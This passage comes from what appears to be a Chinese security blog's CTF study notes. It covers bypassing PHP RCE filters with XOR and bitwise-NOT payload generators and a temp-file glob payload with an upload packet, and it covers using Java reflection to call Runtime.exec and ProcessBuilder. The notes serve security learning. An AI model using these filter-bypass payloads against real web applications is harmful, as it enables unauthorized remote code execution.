class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>); <span class="comment">//ascii的前16个字符的十六进制应该是01，02，所以在前缀加‘0’</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);  <span class="comment">//前16个后面的就不用加0了</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);   <span class="comment">//同理上方</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);      <span class="comment">//同理上方</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> =<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;     <span class="comment">//如果有符合条件的就筛掉，输出空格</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;             <span class="comment">//可以使用的字符如下</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;    <span class="comment">//十六进制前加百分号就变成了URL编码格式</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));  <span class="comment">//urldecode函数是解URL编码，把他们变成字符串，这里是字符串进行按位或运算，按位或运算后，可以得到新的字符，如%21和%00进行按位或就变成了!,这样我们就可以使用感叹号,就类似于合成新的字符</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;          <span class="comment">//ord函数是将字符变成ASCII码</span></span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;     <span class="comment">//每次到这里都写入刚刚建立的文本内</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;text.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()  <span class="comment"># 逐行读取文件 //每一次循环，指针都会指向下一行，输出下一行的字符</span></span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:  <span class="comment"># 读到空，即读完跳出循环</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:  <span class="comment"># 就比如我们这边输入的arg是system，当文本当前行第一个字母是s或者y这些字符就写入s1,s2</span></span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]  <span class="comment"># 提取第一个字符串，具体可以看上面我的截图，如第一行的%00</span></span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]  <span class="comment"># 提取第二个字符串</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span>  <span class="comment"># s1和s2进行或运算就可以合成对应的字母s,y,s,t,e,m</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function:&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><p>用法</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240818201118170.png" alt="image-20240818201118170"></p><blockquote><p>据说可以用或来： <code>|</code></p></blockquote><h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><h2 id="缓存文件"><a href="#缓存文件" class="headerlink" title="缓存文件"></a>缓存文件</h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>参考p神的文章</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821151435925.png" alt="image-20240821151435925"></p><p>从表格中可以看到，PHP 7引入了一种新的解析顺序，这种顺序与PHP 5不同，导致某些表达式在PHP 7下的执行结果与PHP 5不同。</p><p>举例说明：</p><ul><li>表达式 <code>$$foo[&#39;bar&#39;][&#39;baz&#39;]</code>：在PHP 5中，这个表达式被解析为 <code>$foo[&#39;bar&#39;][&#39;baz&#39;]</code> 后再进行双重变量解析。而在PHP 7中，解析顺序改变，<code>($$foo)</code> 首先被计算，然后再应用数组索引。</li></ul><p>意思是：php7前没办法（$a）(); <code>因为php5是先解析（）；里面，为空。</code></p><p>相当于可以：<code>(&#39;phpinfo&#39;)();</code></p><p>看一下题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>)&gt;<span class="number">35</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;toooooolong!&#x27;</span>);   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本上该过滤的都过滤完了</p><h3 id="php7"><a href="#php7" class="headerlink" title="php7"></a>php7</h3><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821154607493.png" alt="image-20240821154607493"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821154616406.png" alt="image-20240821154616406"></p><p>取反，然后用之前那个表达式<code>()();</code></p><h3 id="php5"><a href="#php5" class="headerlink" title="php5"></a>php5</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:5.6-apache</span><br></pre></td></tr></table></figure><p>首先从想到可以用反引号执行命令</p><p>注意两个知识点：</p><ol><li>shell下可以利用<code>.</code>来执行任意脚本</li><li>Linux文件名支持用glob通配符代替</li></ol><blockquote><p> 注意这里，<code>.</code>是所有UNIX系的shell都可以，但是<code>source</code>属于bash</p></blockquote><p>然后基本&#x2F;tmp下的文件都可执行</p><p>而发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是<code>随机</code>的<code>大小写字母</code>。</p><ol><li><code>*</code>可以代替0个及以上任意字符</li><li><code>?</code>可以代表1个任意字符</li></ol><p>所以：&#x2F;tmp&#x2F;phpXXXXXX &#x3D;&gt; &#x2F;*&#x2F;????????? 或 &#x2F;???&#x2F;?????????</p><p>注意：</p><blockquote><p>glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。</p><p>就跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围。</p></blockquote><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821160049068.png" alt="image-20240821160049068"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821160130731.png" alt="image-20240821160130731"></p><p>我们可以利用<code>[@-[]</code>来表示大写字母：<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821160212304.png" alt="image-20240821160212304"></p><p>因为只有php临时文件可能有大写</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821171357305.png" alt="image-20240821171357305"></p><p>注意写数据包时不要写错！</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary0Ra0WsQ0aDxSuWXg</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>156</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary0Ra0WsQ0aDxSuWXg</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundary0Ra0WsQ0aDxSuWXg--</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`.%20/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[@-[]`%3b?&gt;</span><br></pre></td></tr></table></figure><p>tip有可能改目录，查看目录函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sys_get_temp_dir</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h1><p>他的正则表达式为<br><code>/[^\W]+\((?R)?\)/</code>，在这里表示递归匹配。</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="getenv"><a href="#getenv" class="headerlink" title="getenv"></a>getenv</h3><p>获取环境变量</p><h3 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump"></a>var_dump</h3><p>打印结果，调试。</p><h3 id="scandir-readfile"><a href="#scandir-readfile" class="headerlink" title="scandir readfile"></a>scandir readfile</h3><p>读取文件</p><h3 id="next"><a href="#next" class="headerlink" title="next"></a>next</h3><p>把数组指针往下移动一位。</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240821173036958.png" alt="image-20240821173036958"></p><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars"></a><strong>get_defined_vars</strong></h3><p>获取定义的所有变量<br><code>cmd=var_dump(next(get_defined_vars()));&amp;a=1</code></p><h3 id="session-start"><a href="#session-start" class="headerlink" title="session_start"></a>session_start</h3><p>启动一个session</p><h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders"></a>getallheaders</h3><p>获取所有的请求头</p><h3 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd"></a>getcwd</h3><p>获取所在目录</p><h3 id="apache-request-headers"><a href="#apache-request-headers" class="headerlink" title="apache_request_headers"></a>apache_request_headers</h3><p>只适用于apache获取请求头。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反射全解</title>
      <link href="/2024/02/26/%E5%8F%8D%E5%B0%84%E5%85%A8%E8%A7%A3/"/>
      <url>/2024/02/26/%E5%8F%8D%E5%B0%84%E5%85%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h2 id="初解"><a href="#初解" class="headerlink" title="初解"></a>初解</h2><p>反射（Reflection）是Java提供的一种机制，允许程序在运行时获取类的结构信息（如类名、方法、构造函数、字段等），并动态地创建对象、调用方法或访问字段。它通常用于框架、动态代理和工具类库中。</p><p>反射相关的类主要位于 <code>java.lang.reflect</code> 包下，而 <code>Class</code> 类是进入反射世界的入口。</p><p><code>RCE流程</code>：</p><p><code>forName</code>获取类 -&gt; <code>newInstance</code>获取该类的实例 -&gt; <code>getMethod(getConstructor)</code>获取该实例的方法 -&gt;<code>invoke</code>执行方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">reflectClass</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">        reflectClass.getMethod(methodName).invoke(reflectClass.newInstance());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 记得 import java.lang.reflect.*;</span></span><br></pre></td></tr></table></figure><h2 id="forName"><a href="#forName" class="headerlink" title="forName"></a>forName</h2><p>可以加载任意类的神器</p><p>必须全限定名，只有默认包才不需要(<code>默认包就是没有声明package</code>)</p><blockquote><p>如果是内部类就是需要<code>example.Class1$evilClass</code></p></blockquote><h2 id="java9之后的升级"><a href="#java9之后的升级" class="headerlink" title="java9之后的升级"></a>java9之后的升级</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; getEvilClass = Class.forName(<span class="string">&quot;example.evilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> getEvilClass.getDeclaredConstructor().newInstance();</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">evilMethod</span> <span class="operator">=</span> getEvilClass.getDeclaredMethod(<span class="string">&quot;evilMethod&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//evilMethod.setAccessible(true); 如果方法是私有类</span></span><br><span class="line"></span><br><span class="line">evilMethod.invoke(instance);</span><br></pre></td></tr></table></figure><blockquote><p>**避免使用原始类型 (<code>raw type</code>)**：使用 <code>Class&lt;?&gt;</code> 是为了避免泛型相关的警告，保证代码的类型安全性。Java中的泛型提供了在编译时进行类型检查的能力，如果不使用泛型，可能会导致运行时的类型转换异常。</p></blockquote><blockquote><p><strong><code>newInstance()</code> 已过时</strong>：<code>clazz.newInstance()</code> 这个方法依赖于无参构造函数，且在Java 9中被标记为过时。推荐使用 <code>getDeclaredConstructor().newInstance()</code>，这样不仅可以显式获取无参构造函数，还能更加灵活地处理私有构造函数的实例化。</p></blockquote><blockquote><p><code>getMethod()</code>只能获得<code>公有方法</code>,包括从<code>父类继承</code>的方法，所以新版则是获得声明的方法：<code>getDeclaredMethod()</code>更加灵活，遇到私有属性可以<code>setAccessible(true)</code>,但是从父类里继承来的就不包含了。</p></blockquote><h3 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">reflectClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">reflectClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(reflectClass.newInstance(), <span class="string">&quot;id&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>这当然是失败的，因为Runtime 类的构造方法是<code>私有的</code>。</p></blockquote><ul><li>注意  这里<code>String.class</code>是告诉 <code>getMethod()</code>，需要找到接受 <code>String</code> 作为参数的方法。</li><li><code>String.class</code> 的 <code>.class</code> 是<strong>获取 <code>Class</code> 对象的语法</strong>，表示当前类型对应的 <code>Class</code> 对象。具体来说：<ul><li>**<code>String.class</code>**：它返回 <code>Class&lt;String&gt;</code>，即代表 <code>String</code> 类的 <code>Class</code> 对象。</li><li>**<code>int.class</code>**：表示基本类型 <code>int</code> 的 <code>Class</code> 对象。</li><li>**<code>void.class</code>**：表示 <code>void</code> 返回类型的 <code>Class</code> 对象。</li></ul></li></ul><p><code>.class</code> 是一种编译时获取类型的 <code>Class</code> 对象的方式，它可以在编译时告诉 Java 反射机制当前的参数类型是什么。这在反射中非常重要，因为你需要准确指定方法的参数类型，反射才能正确地找到匹配的方法。</p><p>两种解决方法：</p><h4 id="通过-Runtime-getRuntime-来获取到-Runtime-对象。"><a href="#通过-Runtime-getRuntime-来获取到-Runtime-对象。" class="headerlink" title="通过 Runtime.getRuntime() 来获取到 Runtime 对象。"></a>通过 Runtime.getRuntime() 来获取到 Runtime 对象。</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">reflectClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">reflectClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(reflectClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(reflectClass), <span class="string">&quot;id&quot;</span>)</span><br><span class="line"><span class="comment">//感觉很不优美</span></span><br><span class="line">    </span><br><span class="line"> <span class="comment">// 1. 获取 Runtime 类的 Class 对象</span></span><br><span class="line">Class&lt;?&gt; reflectClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 获取 Runtime 类的 getRuntime() 方法，并通过反射调用它来获得 Runtime 实例</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> reflectClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> getRuntimeMethod.invoke(<span class="literal">null</span>);  <span class="comment">// getRuntime 是静态方法，因此第一个参数传 null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 获取 exec(String) 方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> reflectClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 调用 exec 方法，传入命令 &quot;id&quot;</span></span><br><span class="line">execMethod.invoke(runtimeInstance, <span class="string">&quot;id&quot;</span>);</span><br><span class="line"><span class="comment">//这就很爽了</span></span><br></pre></td></tr></table></figure><h4 id="新方法"><a href="#新方法" class="headerlink" title="新方法"></a>新方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; getEvilClass = Class.forName(<span class="string">&quot;example.evilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">Constructor&lt;?&gt; constructor = getEvilClass.getDeclaredConstructor();</span><br><span class="line"><span class="comment">//有参 getEvilClass.getDeclaredConstructor(String.class);</span></span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"><span class="comment">//传参 constructor.newInstance(&quot;Hello, World!&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">evilMethod</span> <span class="operator">=</span> getEvilClass.getDeclaredMethod(<span class="string">&quot;evilMethod&quot;</span>);</span><br><span class="line"></span><br><span class="line">evilMethod.setAccessible(<span class="literal">true</span>); </span><br><span class="line"></span><br><span class="line">evilMethod.invoke(instance);</span><br></pre></td></tr></table></figure><h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><p><strong>重载（Overloading）</strong> 是面向对象编程中一种方法名称的多态性，指的是在<strong>同一个类</strong>中，允许存在<strong>多个同名</strong>的<strong>方法</strong>，但是这些方法的<strong>参数列表</strong>（即参数的类型、数量或顺序）必须<strong>不同</strong>。通过重载，可以在相同的方法名下实现不同的功能，编译器会根据方法调用时的参数类型和数量，选择对应的重载方法。</p><p>例子</p><p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20240906170738779.png" alt="image-20240906170738779"></p><p>有三种重载选第一种单参数的重载就可以。</p><h2 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h2><p><code>invoke()</code> 是 Java 反射机制中的一个关键方法，属于 <code>Method</code> 类。它用于在运行时调用通过反射获取的方法。换句话说，<code>invoke()</code> 允许你在不知道或无法直接访问某个类的情况下，动态地调用该类的某个方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object <span class="title function_">invoke</span><span class="params">(Object obj, Object... args)</span> <span class="keyword">throws</span> IllegalAccessException, IllegalArgumentException, InvocationTargetException</span><br></pre></td></tr></table></figure><ul><li>**<code>obj</code>**：要调用该方法的对象。如果调用的是静态方法，则该参数传递 <code>null</code>。</li><li>**<code>args</code>**：传递给方法的参数。如果该方法不需要参数，则可以传递 <code>null</code> 或空数组。</li></ul><p>返回值：<code>invoke()</code> 返回的是该方法的返回值，如果该方法的返回类型是 <code>void</code>，那么 <code>invoke()</code> 返回 <code>null</code>。</p><p>直白一点：</p><p>正常执行方法是<code> [1].method([2], [3], [4]...)</code> ，其实在反射里就是</p><p><code>method.invoke([1], [2], [3], [4]...)</code> 。</p><p>所以上面的例子的另一种写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">reflectClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> reflectClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class)；</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> reflectClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(reflectClass);</span><br><span class="line">execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span 